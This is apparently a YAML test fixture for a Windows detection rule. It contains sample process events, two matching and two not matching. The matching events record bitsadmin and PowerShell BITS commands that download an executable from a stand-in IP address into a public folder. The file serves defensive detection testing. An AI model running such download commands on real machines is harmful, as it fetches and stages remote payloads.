docs:
- id: pos1
  match: true
  doc:
    host:
      os: {type: windows}
      name: win1
    user: {name: alice}
    event: {category: process, type: start}
    process: {name: bitsadmin.exe, executable: 'C:\Windows\System32\bitsadmin.exe', command_line: 'bitsadmin /transfer j
        /download /priority high http://203.0.113.9/a.exe C:\Users\Public\a.exe'}
- id: pos2
  match: true
  doc:
    host:
      os: {type: windows}
      name: win1
    user: {name: alice}
    event: {category: process, type: start}
    process: {name: powershell.exe, executable: 'C:\Windows\System32\powershell.exe', command_line: 'powershell Start-BitsTransfer
        -Source http://203.0.113.9/a.exe -Destination a.exe'}
- id: neg1
  doc:
    host:
      os: {type: windows}
      name: win1
    user: {name: alice}
    event: {category: process, type: start}
    process: {name: bitsadmin.exe, executable: 'C:\Windows\System32\bitsadmin.exe', command_line: bitsadmin /list}
- id: neg2
  doc:
    host:
      os: {type: windows}
      name: win1
    user: {name: alice}
    event: {category: process, type: start}
    process: {name: powershell.exe, executable: 'C:\Windows\System32\powershell.exe', command_line: powershell Get-BitsTransfer}
